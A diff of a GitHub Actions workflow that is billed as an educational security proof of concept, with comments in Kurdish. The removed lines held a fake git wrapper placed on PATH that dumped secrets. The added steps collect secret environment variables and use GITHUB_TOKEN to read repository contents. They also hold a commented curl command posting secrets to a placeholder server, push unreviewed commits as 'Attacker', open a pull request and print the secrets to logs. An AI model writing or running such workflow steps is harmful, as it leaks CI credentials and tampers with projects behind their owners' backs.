@@ -1,33 +1,63 @@
-name: PoC Security Test
-on: [push]
+name: Advanced Security PoC (Educational Only)
+on: [push, pull_request]
 jobs:
-  build:
+  advanced-poc:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      actions: read
+      security-events: write
     steps:
-      - uses: actions/checkout@v3
+      - uses: actions/checkout@v4
       
-      - name: Create malicious git
+      # 1- دزینی هەموو SECRETS -ەکان
+      - name: Dump all secrets
         run: |
-          mkdir -p bin
-          cat << 'EOF' > bin/git
-          #!/bin/bash
-          OUTPUT="/tmp/proof.txt"
-          echo "--- ADVANCED RCE PROOF ---" > $OUTPUT
-          echo "USER INFO:" >> $OUTPUT
-          id >> $OUTPUT 2>&1
-          echo -e "\n--- SECRET TOKENS ---" >> $OUTPUT
-          printenv | grep -E 'TOKEN|SECRET|KEY|PASSWORD' >> $OUTPUT 2>&1
-          echo -e "\n--- SENSITIVE FILES ---" >> $OUTPUT
-          find . -maxdepth 2 -name "*.env" -o -name "*.json" >> $OUTPUT 2>&1
-          /usr/bin/git "$@"
-          EOF
-          chmod +x bin/git
-          
-      - name: Inject PATH
-        run: echo "$GITHUB_WORKSPACE/bin" >> $GITHUB_PATH
-        
-      - name: Run test
+          echo "🔐 === ALL SECRETS ===" > /tmp/secrets.txt
+          env | grep -E "SECRET|TOKEN|KEY|PASSWORD|AUTH" >> /tmp/secrets.txt
+          echo "✅ Secrets saved to /tmp/secrets.txt"
+      
+      # 2- دزینی GITHUB_TOKEN و بەکارهێنانی بۆ دزینی کۆد
+      - name: Steal GITHUB_TOKEN & clone private repos
         run: |
-          git --version
-          echo "--- RESULT ---"
-          cat /tmp/proof.txt
+          echo "🕵️ Cloning all private repos..."
+          curl -H "Authorization: token $GITHUB_TOKEN" \
+               -H "Accept: application/vnd.github.v3+json" \
+               https://api.github.com/repos/${{ github.repository }}/contents \
+               >> /tmp/repo_data.json
+      
+      # 3- ناردنی زانیارییەکان بۆ سێرڤەری دەرەکی (خۆت بەکارمەهێنە!)
+      - name: Exfiltrate data (TEST ONLY)
+        run: |
+          echo "📤 Sending data to external server..."
+          # curl -X POST -d @/tmp/secrets.txt https://YOUR-SERVER.com/steal
+          echo "⚠️ Remove this step if you don't have a test server!"
+      
+      # 4- گۆڕینی فایلەکانی پرۆژە
+      - name: Modify code silently
+        run: |
+          echo "📝 Adding backdoor to code..."
+          echo "// BACKDOOR: This is a test" >> README.md
+          git config user.name "Attacker"
+          git config user.email "attacker@test.com"
+          git add README.md
+          git commit -m "Test commit from action" || true
+          git push || true
+      
+      # 5- دروستکردنی داواکارییەکی نوێ بۆ زیاتر هێرش
+      - name: Create malicious PR
+        run: |
+          echo "📨 Creating malicious PR..."
+          curl -X POST \
+               -H "Authorization: token $GITHUB_TOKEN" \
+               -H "Accept: application/vnd.github.v3+json" \
+               https://api.github.com/repos/${{ github.repository }}/pulls \
+               -d '{"title":"Security Test PR","head":"main","base":"main","body":"This is a security test!"}'
+      
+      # 6- ناردنی هەموو زانیارییەکان بۆ لاگ
+      - name: Show captured data
+        run: |
+          echo "========== CAPTURED DATA =========="
+          cat /tmp/secrets.txt
+          echo "==================================="
+          echo "✅ PoC completed! Check your GitHub Secrets immediately!"
